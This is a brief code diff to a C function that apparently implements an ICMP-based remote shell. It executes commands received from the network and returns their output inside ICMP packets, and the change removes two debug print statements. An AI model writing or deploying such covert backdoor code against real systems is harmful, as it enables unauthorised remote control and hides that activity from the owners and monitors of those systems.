@@ -174,9 +174,8 @@ void interact(int sockfd, char *dest_ip) {
         data[BUFFER_SIZE] = '\0';
 
         // invoke the command
-        printf("[DEBUG] extracted data was: %sEOF\n", data);
         output = invoke_command(data);
-        printf("[DEBUG] output of command is: %sEOF\n", output);
+
         // put the output in the data section of the ICMP packet
         memcpy((char *) data, output, strlen(output));
 
